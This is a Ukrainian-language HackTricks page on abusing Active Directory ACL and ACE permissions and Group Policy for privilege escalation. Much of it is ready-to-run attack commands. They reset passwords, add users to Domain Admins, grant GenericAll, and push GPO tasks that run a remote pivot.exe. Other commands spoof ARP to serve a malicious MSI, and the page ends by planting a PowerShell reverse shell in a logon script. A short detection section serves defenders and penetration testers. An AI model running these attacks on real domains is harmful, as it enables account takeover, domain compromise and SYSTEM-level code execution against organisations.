# Зловживання ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого підсумовує методи з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **і** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Щоб дізнатися більше, перегляньте оригінальні статті.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Права GenericAll на користувача**

Цей привілей надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl` зловмисник може:

- **Змінити пароль цільового користувача**: за допомогою `net user <username> <password> /domain` зловмисник може скинути пароль користувача.
- У Linux можна зробити те саме через SAMR за допомогою Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Якщо обліковий запис вимкнено, зніміть прапорець UAC**: `GenericAll` дозволяє редагувати `userAccountControl`. У Linux BloodyAD може зняти прапорець `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Призначте обліковому запису користувача SPN, щоб зробити його kerberoastable, а потім використайте Rubeus і targetedKerberoast.py, щоб отримати хеші ticket-granting ticket (TGT) і спробувати їх зламати.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Вимкнення попередньої автентифікації для користувача, що робить його обліковий запис вразливим до ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` для користувача, ви можете додати облікові дані на основі сертифіката й автентифікуватися від його імені, не змінюючи пароль. Див.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll на групу**

Цей привілей дає зловмиснику змогу змінювати членство в групах, якщо він має права `GenericAll` для такої групи, як `Domain Admins`. Визначивши distinguished name групи за допомогою `Get-NetGroup`, зловмисник може:

- **Додати себе до групи Domain Admins**: це можна зробити за допомогою прямих команд або модулів, як-от Active Directory чи PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- З Linux також можна скористатися BloodyAD, щоб додати себе до довільних груп, якщо маєте права GenericAll/Write на керування членством у них. Якщо цільова група вкладена в “Remote Management Users”, ви одразу отримаєте доступ до WinRM на хостах, де ця група має відповідні права:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв для об’єкта комп’ютера або облікового запису користувача дає змогу:

- **Kerberos Resource-based Constrained Delegation**: захопити об’єкт комп’ютера.
- **Shadow Credentials**: видати себе за обліковий запис комп’ютера або користувача, скориставшись привілеями для створення shadow credentials.

## Переміщення об’єкта до OU зі спадковими дозволами

Шлях атаки може поєднувати **права на переміщення облікового запису** з **правами на запис, успадкованими від цільового OU**, навіть якщо спочатку жоден із принципалів не може змінювати важливі атрибути облікового запису. Перевірте дозволи на переміщення вихідного об’єкта та право `CreateChild` у цільовому OU, перемістіть об’єкт, а потім повторно перевірте його ефективний DACL. Наприклад, команда powerview.py `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` переміщує користувача; після цього контрольована група з успадкованим `GenericWrite` для цього OU може додати [shadow credential](shadow-credentials.md). Саме переміщення не створює успадкованого права.<sup>[[18]](#references)</sup>

Якщо у вас є `GenericAll` для OU, але немає відповідного успадкованого ACE, команда `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` може додати його для дочірніх об’єктів. Перевірте цільовий обліковий запис окремо: **для облікових записів, захищених AdminSDHolder, успадкування вимкнено**, тому ACE для OU може впливати на звичайних користувачів, але не діяти на захищений обліковий запис. Див. [AdminSDHolder і SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Окремий шлях зловживання можливий, якщо привілейований скрипт запланованого очищення вибирає OU на основі ACE, на які може вплинути зловмисник, а потім виконує для їхніх дочірніх об’єктів `Set-ADObject -Clear adminCount` **і** `$acl.SetAccessRuleProtection($False, $False)`. Якщо ви можете змінювати DACL OU, надайте групі, яку перевіряє скрипт, необхідний ACE `ExtendedRight` або `GenericAll`; окремо перевірте, чи можете запустити завдання. Тоді привілейоване завдання може відновити успадкування для раніше захищеного облікового запису, дозволивши застосувати ACE OU. Перевірте точний скрипт, дозвіл на запуск і кінцевий DACL; саме лише очищення `adminCount` не вмикає успадкування повторно, а SDProp може знову захистити облікові записи, які залишаються в захищених групах.<sup>[[18]](#references)</sup>

## **WriteProperty для групи**

Якщо користувач має права `WriteProperty` для всіх об’єктів певної групи (наприклад, `Domain Admins`), він може:

- **Додати себе до групи Domain Admins**: цього можна досягти, поєднавши команди `net user` і `Add-NetGroupUser`; такий спосіб дає змогу підвищити привілеї в домені.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (самостійне членство) у групі**

Цей привілей дає зловмисникам змогу додавати себе до певних груп, наприклад `Domain Admins`, за допомогою команд, які безпосередньо змінюють членство в групах. Наведена нижче послідовність команд дає змогу додати себе до групи:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Подібний привілей дає зловмисникам змогу безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` для цих груп. Перевірити наявність і скористатися цим привілеєм можна за допомогою:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Наявність права `ExtendedRight` для користувача `User-Force-Change-Password` дає змогу скидати пароль, не знаючи поточного. Перевірити це право та скористатися ним можна через PowerShell або альтернативні інструменти командного рядка. Вони пропонують кілька способів скидання пароля користувача, зокрема в інтерактивних сесіях і за допомогою однорядкових команд у неінтерактивних середовищах. Команди варіюються від простих викликів PowerShell до використання `rpcclient` у Linux, демонструючи різноманітність векторів атак.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner on Group**

Якщо зловмисник виявить, що має права `WriteOwner` щодо групи, він може змінити власника групи на себе. Це особливо небезпечно, коли йдеться про групу `Domain Admins`, оскільки зміна власника дає змогу ширше контролювати атрибути групи та її членство. Для цього потрібно знайти відповідний об’єкт за допомогою `Get-ObjectAcl`, а потім скористатися `Set-DomainObjectOwner`, щоб змінити власника, вказавши SID або ім’я.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite для користувача**

Цей дозвіл дає зловмиснику змогу змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до сценарію входу користувача, щоб під час входу виконати шкідливий сценарій. Для цього використовується команда `Set-ADObject`, яка оновлює властивість `scriptpath` цільового користувача, вказуючи шлях до сценарію зловмисника.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Вужчого ACE `WriteProperty`, обмеженого атрибутом [`scriptPath` користувача](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), може бути достатньо; `GenericWrite` не потрібен. Поєднайте цей дозвіл на атрибут із доступним для запису скриптом у дереві `SYSVOL\<domain>\scripts` або `NETLOGON` домену, а потім оцініть, чи ймовірно, що цільовий користувач увійде в систему та запустить скрипт. Під час входу скрипт запускається в контексті цього користувача. Перевіряйте ефективні ACL AD та файлів/спільних ресурсів окремо: наявність відповідного ACE Allow або доступного для запису каталогу сама по собі не підтверджує, що весь ланцюжок працюватиме.

## **GenericWrite для групи**

За наявності цього привілею зловмисники можуть змінювати членство в групах, наприклад додавати до певних груп себе або інших користувачів. Для цього створюють обліковий об’єкт, використовують його, щоб додавати користувачів до групи або вилучати їх із неї, а потім перевіряють зміни членства за допомогою команд PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- З Linux Samba `net` може додавати/видаляти учасників, якщо у вас є `GenericWrite` на групу (корисно, коли PowerShell/RSAT недоступні):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Володіння об’єктом AD і наявність привілеїв `WriteDACL` щодо нього дають зловмиснику змогу надати собі привілеї `GenericAll` для цього об’єкта. Це виконується за допомогою маніпуляцій з ADSI, що дає повний контроль над об’єктом і можливість змінювати його членство в групах. Попри це, під час спроби скористатися цими привілеями за допомогою командлетів `Set-Acl` / `Get-Acl` модуля Active Directory існують обмеження.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Швидке захоплення контролю через WriteDACL/WriteOwner (PowerView)

Якщо у вас є права `WriteOwner` і `WriteDacl` на обліковий запис користувача або служби, ви можете отримати повний контроль і скинути його пароль за допомогою PowerView, не знаючи старого пароля:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Примітки:
- Можливо, спочатку потрібно змінити власника на себе, якщо у вас є лише WriteOwner:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Перевірте доступ за допомогою будь-якого протоколу (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

Атака DCSync використовує певні дозволи на реплікацію в домені, щоб імітувати контролер домену та синхронізувати дані, зокрема облікові дані користувачів. Для цієї потужної техніки потрібні такі дозволи, як `DS-Replication-Get-Changes`, які дають змогу зловмисникам отримувати конфіденційну інформацію із середовища AD без прямого доступу до контролера домену.<sup>[[5]](#references)</sup> [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ до керування об’єктами групової політики (GPO) може становити значний ризик для безпеки. Наприклад, якщо користувачеві, як-от `offense\spotless`, делеговано права на керування GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** і **WriteOwner**. Цими дозволами можна зловживати зі зловмисною метою; це можна виявити за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Перелік дозволів GPO

Щоб виявити неправильно налаштовані GPO, можна об’єднати cmdlet-и PowerSploit. Це дає змогу знайти GPO, якими має право керувати певний користувач: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп’ютери, до яких застосовано певну політику**: Можна визначити, до яких комп’ютерів застосовується певна GPO, щоб зрозуміти потенційний масштаб впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп’ютера**: Щоб переглянути політики, застосовані до конкретного комп’ютера, можна використовувати такі команди, як `Get-DomainGPO`.

**OU, до яких застосовано певну політику**: Визначити організаційні підрозділи (OU), на які поширюється певна політика, можна за допомогою `Get-DomainOU`.

Для переліку GPO та виявлення проблем у них також можна скористатися інструментом [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Зловживання GPO — New-GPOImmediateTask

Неправильно налаштовані GPO можна використати для виконання коду, наприклад, створивши негайне заплановане завдання. Це можна зробити, щоб додати користувача до локальної групи адміністраторів на уражених комп’ютерах і значно підвищити його привілеї:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Модуль GroupPolicy, якщо його встановлено, дає змогу створювати й прив’язувати нові GPO, а також задавати параметри, наприклад значення реєстру, для запуску бекдорів на уражених комп’ютерах. Для цього методу потрібно оновити GPO, а користувач має ввійти в систему на комп’ютері, щоб код виконався:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse дає змогу зловживати наявними GPO, додаючи завдання або змінюючи параметри без потреби створювати нові GPO. Для цього інструменту потрібно змінити наявні GPO або скористатися інструментами RSAT, щоб створити нові перед застосуванням змін:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб пришвидшити цей процес, особливо після внесення змін, на цільовому комп’ютері можна виконати команду `gpupdate /force` і примусово оновити політику негайно. Ця команда гарантує, що всі зміни в GPO буде застосовано, не чекаючи наступного циклу автоматичного оновлення.

### Як це працює

Перевіривши Scheduled Tasks для певної GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання таких завдань, як `evilTask`. Ці завдання створюються за допомогою скриптів або інструментів командного рядка, призначених для зміни поведінки системи або підвищення привілеїв.

Структура завдання, показана у файлі конфігурації XML, створеному за допомогою `New-GPOImmediateTask`, визначає параметри запланованого завдання, зокрема команду для виконання та її тригери. Цей файл показує, як заплановані завдання визначаються та керуються в GPO, і дає змогу виконувати довільні команди або скрипти в межах застосування політики.

### Користувачі та групи

GPO також дають змогу змінювати членство користувачів і груп у цільових системах. Безпосередньо редагуючи файли політики Users and Groups, зловмисники можуть додавати користувачів до привілейованих груп, наприклад до локальної групи `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, що дозволяє змінювати файли політики, додаючи нових користувачів або змінюючи членство в групах.

Файл конфігурації XML для Users and Groups описує, як реалізуються ці зміни. Додавши записи до цього файлу, можна надати певним користувачам підвищені привілеї на всіх системах, на які поширюється політика. Цей метод забезпечує прямий шлях до підвищення привілеїв через маніпуляції з GPO.

Для параметрів безпеки, як-от членство в локальних групах і права користувачів, також перевірте застосований шаблон GPO за шляхом `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` і ACL каталогу `SecEdit`. Доступний для запису каталог або файл — це привід для перевірки: фактичний доступ до спільного ресурсу SYSVOL, заборони та успадковані ACL, дозволи контейнера Group Policy, область дії політики й оновлення клієнта все одно визначають, чи набудуть зміни чинності. Сам факт членства в групі з назвою “GPO Managers” не підтверджує наявність прав на редагування. [Microsoft описує шлях до цього шаблону та розділення контейнера Group Policy і шаблону.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Крім того, можна розглянути й інші способи виконання коду або збереження доступу: використання скриптів входу та виходу із системи, зміну ключів реєстру для автоматичного запуску, встановлення програмного забезпечення через файли .msi або редагування конфігурацій служб. Ці методи дають різні можливості для збереження доступу й керування цільовими системами через зловживання GPO.

### Перенаправлення отримання GPC/GPT на автентифіковані шахрайські служби

GPO складається з LDAP-об’єкта **Group Policy Container (GPC)** з метаданими та розміщеного на SMB **Group Policy Template (GPT)** з файлами політики. Під час оновлення клієнт переходить за `gPLink` контейнера, зчитує відповідний GPC і його `gPCFileSysPath`, а потім завантажує GPT із цього шляху UNC. Отже, доступ на запис до самого GPC або до `gPLink` OU, Site чи Domain можна використати для запуску обробки політики з підвищеними привілеями.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Отруєння `gPCFileSysPath` за допомогою GPOddity

Якщо контрольований принципал може записувати дані до цільового GPC (безпосередньо або через **NTLM relay до LDAP**), замініть `gPCFileSysPath` на шлях UNC, розміщений зловмисником. [GPOddity](https://github.com/synacktiv/GPOddity) автоматизує зміну LDAP і надає шкідливий GPT із файлами політики на основі модулів або Immediate Task, який клієнт Group Policy виконує від імені `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Анонімного SMB-ресурсу або ресурсу, що не залежить від облікових даних, недостатньо для сучасних клієнтів Windows: SMB Secure Negotiate вимагає підтвердження успішної автентифікації, тому шахрайська служба має перевірити доменну ідентичність, отримати ключ сеансу SMB і правильно підписувати свої відповіді. Для вбудованого режиму налаштуйте GPOddity за допомогою контрольованого облікового запису комп’ютера та його ключа служби, а потім виберіть корисне навантаження на стороні комп’ютера або користувача в секції `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Особливий випадок GPO:** після MS16-072 Windows і далі створює два сеанси SMB2 в межах **одного TCP-з'єднання**: сеанс користувача читає `GPT.INI`, а потім сеанс облікового запису комп'ютера читає ефективну конфігурацію, як-от `ScheduledTasks.xml`. Тому шахрайський сервер має індексувати стан автентифікації, ключі сеансу та ключі підпису за `SessionId` SMB2, а не лише за сокетом. Форк Scapy, вбудований у GPOddity/OUned, реалізує це через `SMBStreamSocketMultiplexing` і `SMBServer` із підтримкою мультиплексування; сервери Impacket/Scapy, що підтримують лише один сеанс, інакше повторно використовують неправильний стан підпису та не працюють із політиками користувачів.<sup>[[15]](#references)</sup>

#### Отруєння `gPLink` за допомогою OUned

Маючи `WriteGPLink`, `GenericWrite` або еквівалентний контроль над OU, Site чи Domain, зловмисник може додати посилання, GPC DN якого обслуговує контрольований зловмисником LDAP-хост. Цей примітив уперше представив Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) автоматизує запис LDAP і ланцюжок зі шкідливих GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Жертва спершу автентифікується на підконтрольному LDAP-сервісі й отримує GPC, у якому `gPCFileSysPath` вказує на підконтрольний SMB-сервіс; потім вона автентифікується на SMB і застосовує наданий GPT. Тому OUned потрібен обліковий запис із SPN LDAP, обліковий запис комп’ютера з HOST SPN для SMB (той самий обліковий запис комп’ютера може задовольнити обидві вимоги) і налаштування DNS-резолюції або зворотного перенаправлення, яке спрямовує порти 389 і 445 на хост оператора.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Вбудований LDAP-сервер Scapy в OUned перевіряє Kerberos/SPNEGO за допомогою справжнього ключа контрольованої служби та видає довільні дані GPC з JSON. Порожній ключ JSON моделює rootDSE, префікси `base64:` позначають бінарні значення, а сервер підтримує операції add/delete/modify/search і пошук типів `BASE`, `LEVEL` та `SUBTREE`; він може узгоджувати відсутність захисту, цілісність або конфіденційність. Це дає змогу повторно використовувати службу, якщо інший компонент Windows переходить за контрольованим зловмисником посиланням LDAP, але вимагає автентифікованого LDAP.<sup>[[15]](#references)</sup>

Не вважайте, що синхронізація пароля облікового запису з фіктивним доменом відтворює всі ключі Kerberos: RC4 обчислюється з пароля, тоді як AES string-to-key також використовує сіль, отриману з імені хоста/домену суб’єкта. Передавання фактичного ключа AES облікового запису до `KerberosSSP` дає змогу не примушувати використання RC4 через помітну зміну `msDS-SupportedEncryptionTypes`, яке обліковий запис комп’ютера може змінювати самостійно.<sup>[[15]](#references)</sup>

#### Вектори виявлення

Корелюйте зміни `gPCFileSysPath` або `gPLink` зі змінами версій GPO та новими XML-файлами Immediate/Scheduled Task. Перевіряйте посилання на неочікувані контексти іменування, UNC-хости поза затвердженим набором DC/SYSVOL, DNS-записи, що перенаправляють імена облікових записів комп’ютерів, квитки служб LDAP/CIFS для незвичних облікових записів комп’ютерів і зміни `msDS-SupportedEncryptionTypes`, які вмикають RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` для OU/домену дає змогу змінити атрибут `gPLink` цільового контейнера та **змусити застосувати наявну GPO**, не редагуючи саму GPO. Це стає цікавим, коли пов’язана GPO вже посилається на віддалений вміст через **UNC-шляхи** (`\\HOST\share\...`), оскільки автентифіковані користувачі можуть читати **SYSVOL** і шукати там політики для повторного використання офлайн.<sup>[[11]](#references)</sup>

Загальний порядок дій:

1. Використайте BloodHound, щоб знайти суб’єкта з `WriteGPLink` для OU та перерахувати комп’ютери/користувачів у цій OU.
2. Зробіть копію `SYSVOL` лише для читання й проаналізуйте GPO в пошуках **Software Installation**, **зіставлень дисків** (`Drives.xml`) і **скриптів входу/запуску**, що містять UNC-шляхи.
3. Віддавайте перевагу політикам із **прямим іменем хоста** (наприклад, `\\DC02\share\pkg.msi`), а не шляхами DFS/простору імен домену, оскільки шляхи на основі імені хоста легше перенаправити за допомогою L2 spoofing.
4. Додайте GUID вибраної GPO до `gPLink` цільової OU, щоб жертва обробила вже наявну політику.
5. У тому самому широкомовному домені виконайте ARP spoofing UNC-хоста та локально прив’яжіть його IP (`ip addr add <target_ip>/32 dev <iface>`), щоб SMB-трафік жертви надходив на ваш хост.
6. Розмістіть очікуваний шлях/ім’я файлу на SMB-сервері зловмисника (наприклад, `smbserver.py`) і дочекайтеся звичайної обробки політики.

Приклад збору `SYSVOL` і зіставлення GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Зв’яжіть наявний GPO із цільовим OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Якщо пов’язана GPO розгортає MSI з UNC-шляху, клієнт завантажить його під час **запуску комп’ютера** та встановить від імені **`NT AUTHORITY\SYSTEM`**. Підмінивши вказаний хост і розмістивши шкідливий MSI за **тим самим мережевим ресурсом, шляхом і назвою**, можна перетворити `WriteGPLink` на виконання коду від імені SYSTEM **без змін у SYSVOL**.

Важливі обмеження:

- **Час має значення**: нове посилання буде помітне після оновлення політики (зазвичай приблизно через 90 хвилин), але **Software Installation** зазвичай запускається після **перезавантаження**.
- Windows Installer зазвичай відстежує розгортання за допомогою **`ProductCode`** пакета. Якщо продукт уже встановлено, розгортання може бути пропущене.
- Щоб інсталятор не відхилив пакет, змініть підроблений MSI так, щоб його **`ProductCode`** і **`PackageCode`** збігалися з кодами легітимного пакета, якого очікує GPO.
- Старі файли оголошень `.aas` можуть залишитися в `SYSVOL`, тому перед використанням цього методу переконайтеся, що розгортання все ще активне.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Перехоплення UNC для зіставлення диска -> захоплення NTLM / ретрансляція WebDAV

Зіставлення дисків GPP у `Drives.xml` змушує користувачів автентифікуватися за вказаним UNC-шляхом під час входу або повторного підключення. Якщо підмінити вказаний хост, можна перехопити **NetNTLMv2**. Якщо навмисно спричинити збій SMB, Windows може повторити спробу через **WebDAV**, надсилаючи **NTLM через HTTP**. Це дає значно більше можливостей для ретрансляції до **LDAP(S)**, **AD CS** або **SMB**.

#### Перехоплення UNC у сценаріях входу/запуску

Такий самий підхід можна застосувати до сценаріїв на UNC-хостах, знайдених у `SYSVOL`:

- **Сценарії входу** зазвичай виконуються в контексті **користувача**.
- **Сценарії запуску** зазвичай виконуються в контексті **комп’ютера / SYSTEM**.

Якщо шлях до сценарію вказує на хост, який можна підмінити, перенаправте UNC-хост і надайте замість нього вміст сценарію з очікуваного розташування.

## Отруєння сценаріїв входу SYSVOL/NETLOGON

Шляхи з правом запису в `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дають змогу змінювати сценарії входу, які виконуються під час входу користувачів через GPO. Це забезпечує виконання коду в контексті безпеки користувачів, які входять у систему.

### Пошук сценаріїв входу
- Перевірте атрибути користувачів на наявність налаштованого сценарію входу:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Скануйте спільні ресурси домену, щоб виявити ярлики або посилання на скрипти:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Аналізуйте файли `.lnk`, щоб визначити цілі, що вказують на SYSVOL/NETLOGON (корисний прийом DFIR і для зловмисників без прямого доступу до GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound відображає атрибут сценарію входу `scriptPath` об’єкта користувача, якщо він заданий. Сценарії входу, налаштовані через GPO, є окремим посиланням на політику, тому також перевірте відповідну GPO.

### Перевірка доступу на запис (не покладайтеся на списки спільних ресурсів)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як доступні лише для читання, навіть якщо точний ACL NTFS сценарію відрізняється. Спершу перевірте цей файл і його батьківський каталог у режимі лише для читання; відповідні ACE Allow залишаються кандидатами, оскільки важливі ефективні дозволи SMB і NTFS, ACE Deny та поточний токен:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Тест запису з дозволом має бути цільовим і з можливістю відкату: створіть резервну копію оригінального скрипту та відновіть його після тесту. Не перезаписуйте робочий logon script лише для перевірки доступу: успішний запис може виконатися під час наступного входу користувача.

### Отруєння VBScript logon script для RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте його на revshells.com), і збережіть оригінальну логіку, щоб не порушити робочі процеси:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
